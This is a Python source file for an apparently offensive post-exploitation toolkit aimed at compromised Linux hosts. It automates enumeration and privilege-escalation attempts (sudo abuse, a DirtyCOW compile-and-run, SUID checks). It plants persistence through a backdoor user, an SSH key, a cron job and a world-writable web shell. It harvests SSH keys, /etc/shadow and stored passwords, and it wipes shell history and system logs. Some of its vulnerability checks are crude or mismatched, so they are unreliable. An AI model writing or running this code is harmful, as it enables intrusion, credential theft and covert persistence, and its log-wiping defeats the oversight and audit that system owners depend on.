"""
Post-Exploitation Automation - Otomatik escalation & lateral movement
Privilege escalation, persistence, data exfiltration
"""

from typing import List, Dict, Optional, Callable
import json


class PostExploitationChain:
    """Post-exploitation workflow automation"""
    
    def __init__(self, executor: Callable[[str], str]):
        """
        executor: function that executes commands and returns output
        Example: lambda cmd: shell.execute(cmd)
        """
        self.executor = executor
        self.findings = {}
        self.privileges = {
            "is_root": False,
            "has_sudo": False,
            "sudo_commands": []
        }
    
    # ==================== ENUMERATION ====================
    
    def enumerate_system(self) -> Dict:
        """Full system enumeration"""
        print("\nðŸ” Enumerating system...\n")
        
        info = {
            "basic": self._get_basic_info(),
            "users": self._get_users(),
            "groups": self._get_groups(),
            "sudo": self._check_sudo(),
            "suid": self._find_suid_binaries(),
            "kernel": self._check_kernel_vulns(),
            "packages": self._get_installed_packages(),
            "network": self._get_network_info(),
            "processes": self._get_running_processes(),
            "cron": self._check_cron_jobs()
        }
        
        self.findings = info
        return info
    
    def _get_basic_info(self) -> Dict:
        """Get basic system information"""
        return {
            "hostname": self.executor("hostname 2>/dev/null"),
            "whoami": self.executor("whoami"),
            "pwd": self.executor("pwd"),
            "uname": self.executor("uname -a"),
            "lsb_release": self.executor("lsb_release -a 2>/dev/null || cat /etc/os-release 2>/dev/null"),
            "date": self.executor("date")
        }
    
    def _get_users(self) -> List[str]:
        """Get all system users"""
        output = self.executor("cat /etc/passwd 2>/dev/null | cut -d: -f1")
        return [u.strip() for u in output.split('\n') if u.strip()]
    
    def _get_groups(self) -> Dict:
        """Get group information"""
        output = self.executor("id")
        return {"current_groups": output.strip()}
    
    def _check_sudo(self) -> Dict:
        """Check sudo privileges"""
        output = self.executor("sudo -l 2>/dev/null")
        
        sudo_info = {
            "available": "sudo" in output.lower(),
            "nopasswd": "NOPASSWD" in output,
            "commands": output
        }
        
        if sudo_info["available"]:
            self.privileges["has_sudo"] = True
            # Extract NOPASSWD commands
            lines = output.split('\n')
            for line in lines:
                if "NOPASSWD" in line:
                    self.privileges["sudo_commands"].append(line.strip())
        
        return sudo_info
    
    def _find_suid_binaries(self) -> List[str]:
        """Find SUID binaries"""
        output = self.executor("find / -perm -4000 2>/dev/null | head -30")
        return [b.strip() for b in output.split('\n') if b.strip()]
    
    def _check_kernel_vulns(self) -> Dict:
        """Check for kernel vulnerabilities"""
        kernel = self.executor("uname -r").strip()
        
        # Known vulnerable kernels
        vulnerabilities = {
            "DirtyCOW": False,
            "PwnKit": False,
            "CVE-2022-0847": False
        }
        
        # Simple pattern matching
        if any(v in kernel for v in ["4.4.0", "3.10", "4.9"]):
            vulnerabilities["DirtyCOW"] = True
        
        if any(v in kernel for v in ["5.10", "5.11", "5.12", "5.13", "5.14", "5.15"]):
            vulnerabilities["PwnKit"] = True
        
        return {"kernel": kernel, "vulnerabilities": vulnerabilities}
    
    def _get_installed_packages(self) -> List[str]:
        """Get installed packages"""
        # Try different package managers
        commands = [
            "dpkg -l 2>/dev/null | awk '{print $2}'",
            "rpm -qa 2>/dev/null",
            "pacman -Q 2>/dev/null | awk '{print $1}'"
        ]
        
        for cmd in commands:
            output = self.executor(cmd)
            if output and "error" not in output.lower():
                return [p.strip() for p in output.split('\n') if p.strip()][:20]
        
        return []
    
    def _get_network_info(self) -> Dict:
        """Get network information"""
        return {
            "ifconfig": self.executor("ip addr show 2>/dev/null || ifconfig 2>/dev/null"),
            "listening_ports": self.executor("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
            "established": self.executor("ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null")
        }
    
    def _get_running_processes(self) -> List[str]:
        """Get running processes"""
        output = self.executor("ps aux 2>/dev/null | head -20")
        return output.split('\n')
    
    def _check_cron_jobs(self) -> str:
        """Check cron jobs"""
        return self.executor("crontab -l 2>/dev/null || (ls -la /etc/cron* 2>/dev/null)")
    
    # ==================== PRIVILEGE ESCALATION ====================
    
    def exploit_sudo_nopasswd(self, command: str = "id") -> Optional[str]:
        """Exploit NOPASSWD sudo"""
        if not self.privileges["sudo_commands"]:
            return None
        
        # Try to run privileged command
        result = self.executor(f"sudo {command}")
        
        if "not allowed" not in result.lower() and "password" not in result.lower():
            print(f"âœ… Sudo exploitation successful!")
            return result
        
        return None
    
    def exploit_dirtycow(self) -> Optional[str]:
        """Attempt DirtyCOW exploit"""
        # This is a placeholder - would need compiled binary
        exploit_cmd = """
gcc -pthread /tmp/dirtycow.c -o /tmp/dirtycow -lcrypt
/tmp/dirtycow
"""
        result = self.executor(exploit_cmd)
        return result if result else None
    
    def exploit_kernel_vulnerability(self) -> Optional[str]:
        """Attempt kernel vulnerability exploitation"""
        kernel = self.findings.get("kernel", {}).get("kernel", "")
        
        exploits = {
            "4.4.0": "CVE-2016-5195",  # DirtyCOW
            "5.14": "CVE-2021-22555",  # Netfilter
        }
        
        for kernel_ver, cve in exploits.items():
            if kernel_ver in kernel:
                print(f"ðŸŽ¯ Vulnerable to {cve}")
                return cve
        
        return None
    
    def privilege_escalation_chain(self) -> Dict:
        """Run privilege escalation chain"""
        print("\nâ¬†ï¸  Attempting privilege escalation...\n")
        
        results = {
            "sudo_nopasswd": self.exploit_sudo_nopasswd(),
            "kernel_vuln": self.exploit_kernel_vulnerability(),
            "suid_exploit": self._exploit_suid()
        }
        
        return results
    
    def _exploit_suid(self) -> Optional[str]:
        """Exploit SUID binaries"""
        suid_bins = self.findings.get("suid", [])
        
        dangerous_suid = {
            "/usr/bin/sudo": "Sudo exploitation",
            "/bin/ping": "Ping exploitation",
            "/usr/bin/passwd": "Password modification"
        }
        
        found = []
        for path, description in dangerous_suid.items():
            if any(path in b for b in suid_bins):
                found.append(f"{path}: {description}")
        
        return found if found else None
    
    # ==================== PERSISTENCE ====================
    
    def add_persistence_backdoor_user(self, username: str = "backup", password: str = "P@ssw0rd") -> bool:
        """Add backdoor user (requires root)"""
        cmd = f"useradd -m -s /bin/bash {username} 2>/dev/null && echo '{username}:{password}' | chpasswd"
        result = self.executor(cmd)
        
        if "error" not in result.lower():
            print(f"âœ… Backdoor user added: {username}")
            return True
        return False
    
    def add_persistence_ssh_key(self, public_key: str) -> bool:
        """Add SSH key for persistence"""
        cmd = f"""
mkdir -p ~/.ssh 2>/dev/null
echo '{public_key}' >> ~/.ssh/authorized_keys 2>/dev/null
chmod 600 ~/.ssh/authorized_keys 2>/dev/null
echo 'SSH persistence added'
"""
        result = self.executor(cmd)
        
        if "persistence" in result.lower():
            print("âœ… SSH key persistence added")
            return True
        return False
    
    def add_persistence_cron(self, cmd: str, schedule: str = "*/5 * * * *") -> bool:
        """Add cron job for persistence"""
        cron_cmd = f"(crontab -l 2>/dev/null; echo '{schedule} {cmd}') | crontab -"
        result = self.executor(cron_cmd)
        
        if "error" not in result.lower():
            print(f"âœ… Cron persistence added: {schedule}")
            return True
        return False
    
    def add_persistence_webshell(self, shell_code: str, path: str = "/var/www/html/shell.php") -> bool:
        """Add web shell (requires web server)"""
        cmd = f"echo '{shell_code}' > {path} && chmod 777 {path}"
        result = self.executor(cmd)
        
        if "error" not in result.lower():
            print(f"âœ… Web shell added: {path}")
            return True
        return False
    
    # ==================== LATERAL MOVEMENT ====================
    
    def find_ssh_keys(self) -> List[str]:
        """Find SSH keys on system"""
        output = self.executor("find ~ -name '*.pem' -o -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' 2>/dev/null")
        
        keys = [k.strip() for k in output.split('\n') if k.strip()]
        print(f"\nðŸ”‘ Found {len(keys)} SSH keys")
        for key in keys:
            print(f"  â€¢ {key}")
        
        return keys
    
    def get_ssh_config(self) -> str:
        """Get SSH configuration"""
        output = self.executor("cat ~/.ssh/config 2>/dev/null")
        return output
    
    def get_known_hosts(self) -> List[str]:
        """Get known SSH hosts"""
        output = self.executor("cat ~/.ssh/known_hosts 2>/dev/null")
        hosts = [h.strip().split()[0] for h in output.split('\n') if h.strip()]
        
        print(f"\nðŸŒ Found {len(hosts)} known hosts")
        for host in hosts[:10]:
            print(f"  â€¢ {host}")
        
        return hosts
    
    # ==================== DATA EXFILTRATION ====================
    
    def find_sensitive_files(self) -> List[str]:
        """Find sensitive files"""
        patterns = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "~/.ssh",
            "~/.bash_history",
            "~/.bashrc"
        ]
        
        found = []
        for pattern in patterns:
            output = self.executor(f"find {pattern} 2>/dev/null")
            if output:
                found.append(output.strip())
        
        return found
    
    def dump_shadow_file(self) -> Optional[str]:
        """Attempt to dump shadow file (requires root)"""
        output = self.executor("cat /etc/shadow 2>/dev/null")
        
        if "root:" in output:
            print("âœ… Shadow file dumped")
            return output
        return None
    
    def search_credentials(self) -> Dict[str, List[str]]:
        """Search for credentials in files"""
        commands = {
            "environment": "env | grep -i pass",
            "history": "history | grep -i pass",
            "files": "grep -r password /home 2>/dev/null | head -10"
        }
        
        creds = {}
        for name, cmd in commands.items():
            output = self.executor(cmd)
            if output:
                creds[name] = [line.strip() for line in output.split('\n') if line.strip()]
        
        return creds
    
    # ==================== CLEANUP ====================
    
    def clear_history(self) -> bool:
        """Clear command history"""
        commands = [
            "history -c",
            "echo '' > ~/.bash_history",
            "echo '' > ~/.zsh_history",
            "cat /dev/null > ~/.history"
        ]
        
        for cmd in commands:
            self.executor(cmd)
        
        print("âœ… History cleared")
        return True
    
    def cleanup_logs(self) -> bool:
        """Cleanup system logs (requires root)"""
        commands = [
            "cat /dev/null > /var/log/auth.log",
            "cat /dev/null > /var/log/syslog",
            "cat /dev/null > /var/log/messages",
            "cat /dev/null > /var/log/secure"
        ]
        
        for cmd in commands:
            self.executor(cmd)
        
        print("âœ… Logs cleaned")
        return True
    
    # ==================== AUTOMATION CHAIN ====================
    
    def full_automation_chain(self) -> Dict:
        """Run full post-exploitation chain"""
        print("\n" + "="*60)
        print("ðŸš€ FULL POST-EXPLOITATION AUTOMATION CHAIN")
        print("="*60)
        
        results = {
            "enumeration": self.enumerate_system(),
            "privilege_escalation": self.privilege_escalation_chain(),
            "persistence": {
                "ssh_key": self.add_persistence_ssh_key("ssh-rsa AAAA..."),
                "cron": self.add_persistence_cron("whoami")
            },
            "lateral_movement": {
                "ssh_keys": self.find_ssh_keys(),
                "known_hosts": self.get_known_hosts()
            },
            "data_exfiltration": {
                "sensitive_files": self.find_sensitive_files(),
                "credentials": self.search_credentials()
            }
        }
        
        print("\n" + "="*60)
        print("âœ… POST-EXPLOITATION COMPLETE")
        print("="*60 + "\n")
        
        return results


# ==================== EXAMPLE USAGE ====================

if __name__ == "__main__":
    # Mock executor (replace with real shell connection)
    def mock_executor(cmd: str) -> str:
        import subprocess
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            return result.stdout.decode() + result.stderr.decode()
        except:
            return ""
    
    chain = PostExploitationChain(mock_executor)
    
    # Run enumeration
    enum = chain.enumerate_system()
    
    # Run privilege escalation
    privesc = chain.privilege_escalation_chain()
    
    # Run full chain
    # results = chain.full_automation_chain()
